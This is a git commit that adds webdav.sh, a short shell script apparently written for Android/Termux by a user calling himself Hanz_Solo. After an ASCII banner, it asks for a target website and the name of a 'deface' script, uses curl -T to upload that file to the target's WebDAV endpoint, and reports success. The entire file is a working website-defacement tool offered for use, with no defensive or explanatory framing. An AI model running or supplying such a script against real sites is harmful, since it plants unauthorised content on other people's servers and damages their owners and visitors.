c26bf2b163ee77fd3b333c987e665cdbf9e19357
/Hanz_Solo <64393586+HanzSolo404@users.noreply.github.com>
2020-04-27 12:44:19 +0700

    Create webdav.sh

---
+++ webdav.sh
@@ -0,0 +1,11 @@
+clear
+cowsay -f eyes 'WEBDAV
+# CopyBy  : Hanz_Solo
+# TEAM    : No Team
+# CONTACT : HanzSolo404@GMAIL.COM' | lolcat
+
+
+read -p " Website Target ==> " target
+read -p " Nama sript Defacenya ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Suksess... "
